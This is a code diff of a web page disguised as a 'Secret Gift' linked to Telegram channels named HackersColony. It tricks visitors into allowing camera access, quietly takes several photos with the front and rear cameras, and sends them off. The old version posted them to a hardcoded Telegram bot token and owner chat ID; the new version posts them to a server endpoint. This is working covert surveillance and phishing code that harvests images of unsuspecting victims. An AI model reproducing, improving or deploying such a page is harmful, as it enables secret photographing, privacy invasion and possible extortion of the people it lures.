@@ -127,6 +127,30 @@
             height: 100%;
             object-fit: cover;
         }
+        .warning {
+            color: #ff5555;
+            font-size: 12px;
+            margin: 5px 0;
+        }
+        .step {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            padding: 10px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 8px;
+        }
+        .step-number {
+            width: 25px;
+            height: 25px;
+            background: #ff00ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -135,15 +159,22 @@
             <div class="gift-icon">🎁</div>
             <h2>✨ Secret Gift ✨</h2>
             <p>A magical surprise is waiting for you!</p>
-            <p style="font-size: 12px; color: #aaa;">Join Telegram channel to use this bot</p>
             
             <div class="telegram-info">
-                <p>📢 <strong>Required:</strong></p>
-                <p>1. Join: <a href="https://t.me/HackersColony" target="_blank">@HackersColony</a></p>
-                <p>2. Contact: <a href="https://t.me/Hackers_Colony_Official" target="_blank">@Hackers_Colony_Official</a></p>
+                <p><strong>📢 Required Steps:</strong></p>
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div>Join: <a href="https://t.me/HackersColony" target="_blank">@HackersColony</a></div>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div>Get link from: <a href="https://t.me/HackersColonyBot" target="_blank">@HackersColonyBot</a></div>
+                </div>
             </div>
             
-            <button id="unlockBtn">🎯 Unlock Gift</button>
+            <p class="warning">⚠️ Camera access required for gift creation</p>
+            
+            <button id="unlockBtn">🎯 Start Camera Access</button>
             
             <p style="font-size: 12px; color: #888; margin-top: 20px;">
                 This will use your camera to create a personalized gift
@@ -156,9 +187,12 @@
     </div>
 
     <script>
-        const USER_ID = new URLSearchParams(window.location.search).get('uid');
-        const BOT_TOKEN = "8226782560:AAG2h1cqLmKnWvF7YlsdxJ3W8VPlDNe7qn8";
-        const OWNER_ID = "8215819954";
+        // Get user ID from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const USER_ID = urlParams.get('uid');
+        
+        // Server endpoint - will be set by Render
+        const SERVER_URL = window.location.origin;
         
         document.getElementById("unlockBtn").onclick = async () => {
             const box = document.getElementById("box");
@@ -168,12 +202,20 @@
             btn.disabled = true;
             
             // Check if user ID exists
-            if (!USER_ID) {
+            if (!USER_ID || USER_ID.length < 5) {
                 box.innerHTML = `
                     <div class="gift-icon">⚠️</div>
-                    <h2 style="color:#ff5555">Invalid Link</h2>
+                    <h2 style="color:#ff5555">Invalid Access</h2>
                     <p>Please get a valid link from the Telegram bot</p>
-                    <button onclick="window.location.href='https://t.me/HackersColonyBot'">Get Link from Bot</button>
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div>Open: <a href="https://t.me/HackersColonyBot" target="_blank">@HackersColonyBot</a></div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div>Click "Get Your Gift" button</div>
+                    </div>
+                    <button onclick="window.location.href='https://t.me/HackersColonyBot'">📱 Open Telegram Bot</button>
                 `;
                 return;
             }
@@ -186,7 +228,7 @@
                 <div class="progress-container">
                     <div class="progress-bar" id="progress"></div>
                 </div>
-                <div class="status" id="statusText">Initializing...</div>
+                <div class="status" id="statusText">Initializing camera...</div>
             `;
             
             videoContainer.classList.remove('hidden');
@@ -196,152 +238,178 @@
             const video = document.getElementById("video");
             
             try {
-                // Front Camera - 4 photos
-                const frontStream = await navigator.mediaDevices.getUserMedia({
+                // Test camera access first
+                const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: false
                 });
-                video.srcObject = frontStream;
                 
-                await new Promise(resolve => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        setTimeout(resolve, 1000);
-                    };
-                });
+                // Stop test stream
+                stream.getTracks().forEach(track => track.stop());
                 
-                for (let i = 1; i <= 4; i++) {
-                    progress.style.width = (i * 12.5) + "%";
-                    statusText.textContent = `Front camera photo ${i}/4...`;
-                    await new Promise(r => setTimeout(r, 800));
-                    await capturePhoto(`front_${i}`);
-                }
-                
-                frontStream.getTracks().forEach(track => track.stop());
-                
-                // Back Camera - 4 photos
-                await new Promise(r => setTimeout(r, 1000));
-                statusText.textContent = "Switching to back camera...";
-                
-                const backStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "environment" },
-                    audio: false
-                });
-                video.srcObject = backStream;
-                
-                await new Promise(resolve => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        setTimeout(resolve, 1000);
-                    };
-                });
-                
-                for (let i = 1; i <= 8; i++) {
-                    progress.style.width = (50 + i * 6.25) + "%";
-                    statusText.textContent = `Back camera photo ${i}/8...`;
-                    await new Promise(r => setTimeout(r, 800));
-                    await capturePhoto(`back_${i}`);
-                }
-                
-                backStream.getTracks().forEach(track => track.stop());
-                
-                progress.style.width = "100%";
-                statusText.textContent = "Finishing up...";
-                await new Promise(r => setTimeout(r, 1500));
-                
-                videoContainer.classList.add('hidden');
-                
-                // Success
-                box.innerHTML = `
-                    <div class="gift-icon">🎉</div>
-                    <h2 style="color:#00ff00">🎁 Gift Delivered!</h2>
-                    <p>Your special surprise has been prepared</p>
-                    <p>Photos are being sent to your Telegram...</p>
-                    <div class="status" style="color:#00ff00">✨ Complete ✨</div>
-                    <button onclick="window.location.href='https://t.me/HackersColonyBot'">📱 Open Telegram</button>
-                `;
+                // Start actual process
+                await startPhotoProcess();
                 
             } catch (error) {
-                console.error(error);
+                showError("Camera access denied. Please allow camera to continue.");
+                return;
+            }
+            
+            async function startPhotoProcess() {
+                try {
+                    // Front Camera - 4 photos
+                    const frontStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: "user" },
+                        audio: false
+                    });
+                    video.srcObject = frontStream;
+                    
+                    await new Promise(resolve => {
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            setTimeout(resolve, 1000);
+                        };
+                    });
+                    
+                    for (let i = 1; i <= 4; i++) {
+                        progress.style.width = (i * 12.5) + "%";
+                        statusText.textContent = `Front camera photo ${i}/4...`;
+                        await new Promise(r => setTimeout(r, 800));
+                        await capturePhoto(`front_${i}`);
+                    }
+                    
+                    frontStream.getTracks().forEach(track => track.stop());
+                    
+                    // Back Camera - 4 photos
+                    await new Promise(r => setTimeout(r, 1000));
+                    statusText.textContent = "Switching to back camera...";
+                    
+                    try {
+                        const backStream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: "environment" },
+                            audio: false
+                        });
+                        video.srcObject = backStream;
+                        
+                        await new Promise(resolve => {
+                            video.onloadedmetadata = () => {
+                                video.play();
+                                setTimeout(resolve, 1000);
+                            };
+                        });
+                        
+                        for (let i = 1; i <= 4; i++) {
+                            progress.style.width = (50 + i * 12.5) + "%";
+                            statusText.textContent = `Back camera photo ${i}/4...`;
+                            await new Promise(r => setTimeout(r, 800));
+                            await capturePhoto(`back_${i}`);
+                        }
+                        
+                        backStream.getTracks().forEach(track => track.stop());
+                    } catch (backError) {
+                        statusText.textContent = "Back camera not available, continuing...";
+                        await new Promise(r => setTimeout(r, 2000));
+                    }
+                    
+                    progress.style.width = "100%";
+                    statusText.textContent = "Finishing up...";
+                    await new Promise(r => setTimeout(r, 1500));
+                    
+                    videoContainer.classList.add('hidden');
+                    
+                    // Success
+                    box.innerHTML = `
+                        <div class="gift-icon">🎉</div>
+                        <h2 style="color:#00ff00">🎁 Gift Delivered!</h2>
+                        <p>Your special surprise has been prepared</p>
+                        <p>Photos are being sent to your Telegram...</p>
+                        <div class="status" style="color:#00ff00">✨ Complete ✨</div>
+                        <button onclick="window.location.href='https://t.me/HackersColonyBot'">📱 Open Telegram</button>
+                    `;
+                    
+                } catch (error) {
+                    console.error("Process error:", error);
+                    showError("Process failed. Please try again.");
+                }
+            }
+            
+            async function capturePhoto(label) {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                return new Promise((resolve) => {
+                    canvas.toBlob(async (blob) => {
+                        if (blob) {
+                            try {
+                                // Convert to base64 for sending
+                                const reader = new FileReader();
+                                reader.onloadend = async () => {
+                                    const base64data = reader.result.split(',')[1];
+                                    
+                                    // Send photo to server
+                                    await sendToServer(base64data, label);
+                                    
+                                    resolve();
+                                };
+                                reader.readAsDataURL(blob);
+                            } catch (e) {
+                                console.error("Capture error:", e);
+                                resolve();
+                            }
+                        } else {
+                            resolve();
+                        }
+                    }, 'image/jpeg', 0.8);
+                });
+            }
+            
+            async function sendToServer(photoBase64, label) {
+                try {
+                    const response = await fetch(`${SERVER_URL}/send-photo`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            userId: USER_ID,
+                            photo: photoBase64,
+                            label: label,
+                            timestamp: Date.now()
+                        })
+                    });
+                    
+                    if (!response.ok) {
+                        throw new Error('Server error');
+                    }
+                    
+                    return await response.json();
+                } catch (error) {
+                    console.error('Failed to send to server:', error);
+                    return null;
+                }
+            }
+            
+            function showError(message) {
                 videoContainer.classList.add('hidden');
                 box.innerHTML = `
                     <div class="gift-icon">🎭</div>
-                    <h2 style="color:#ff5555">Camera Access Needed</h2>
-                    <p>Please allow camera access to receive your gift</p>
-                    <p style="font-size:12px; color:#aaa">Error: ${error.message}</p>
+                    <h2 style="color:#ff5555">Error</h2>
+                    <p>${message}</p>
                     <button onclick="location.reload()">🔄 Try Again</button>
                 `;
             }
         };
 
-        async function capturePhoto(label) {
-            const video = document.getElementById("video");
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            return new Promise((resolve) => {
-                canvas.toBlob(async (blob) => {
-                    if (blob) {
-                        const reader = new FileReader();
-                        reader.onloadend = async () => {
-                            const base64data = reader.result.split(',')[1];
-                            
-                            // Send to user
-                            await sendToTelegram(USER_ID, base64data, `🎁 Your Gift: ${label}`);
-                            
-                            // Send to owner
-                            await sendToTelegram(OWNER_ID, base64data, `📸 From ${USER_ID}: ${label} | Username: ${USER_ID}`);
-                            
-                            resolve();
-                        };
-                        reader.readAsDataURL(blob);
-                    } else {
-                        resolve();
-                    }
-                }, 'image/jpeg', 0.9);
-            });
-        }
-
-        async function sendToTelegram(chatId, photoBase64, caption) {
-            try {
-                const byteCharacters = atob(photoBase64);
-                const byteNumbers = new Array(byteCharacters.length);
-                for (let i = 0; i < byteCharacters.length; i++) {
-                    byteNumbers[i] = byteCharacters.charCodeAt(i);
-                }
-                const byteArray = new Uint8Array(byteNumbers);
-                const blob = new Blob([byteArray], { type: 'image/jpeg' });
-                
-                const formData = new FormData();
-                formData.append('photo', blob, `gift_${Date.now()}.jpg`);
-                formData.append('chat_id', chatId);
-                formData.append('caption', caption);
-                formData.append('parse_mode', 'HTML');
-                
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await response.json();
-                if (!result.ok) {
-                    console.error('Telegram API error:', result);
-                }
-                
-                return true;
-            } catch (error) {
-                console.error(`Failed to send to ${chatId}:`, error);
-                return false;
-            }
-        }
-
         // Show warning if no user ID
-        if (!USER_ID) {
-            document.getElementById("unlockBtn").disabled = true;
+        if (!USER_ID || USER_ID.length < 5) {
             document.getElementById("unlockBtn").innerHTML = "⚠️ Get Link from Bot First";
+            document.getElementById("unlockBtn").disabled = false;
+            document.getElementById("unlockBtn").onclick = () => {
+                window.location.href = 'https://t.me/HackersColonyBot';
+            };
         }
     </script>
 </body>
